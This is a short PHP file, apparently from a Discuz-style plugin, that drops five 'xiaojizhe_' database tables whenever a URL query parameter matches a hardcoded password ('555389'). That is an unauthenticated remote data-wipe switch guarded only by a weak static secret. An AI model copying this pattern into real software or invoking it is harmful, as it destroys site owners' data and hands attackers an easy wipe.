<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/4/19
 * Time: 11:45
 */
$password = $_GET['password'];
if($password=='555389'){
    DB::query("DROP TABLE `xiaojizhe_xy_active`");
    DB::query("DROP TABLE `xiaojizhe_prize_list`");
    DB::query("DROP TABLE `xiaojizhe_lotto_list`");
    DB::query("DROP TABLE `xiaojizhe_lucky_list`");
    DB::query("DROP TABLE `xiaojizhe_extra_times`");
    echo "Íê³É";
}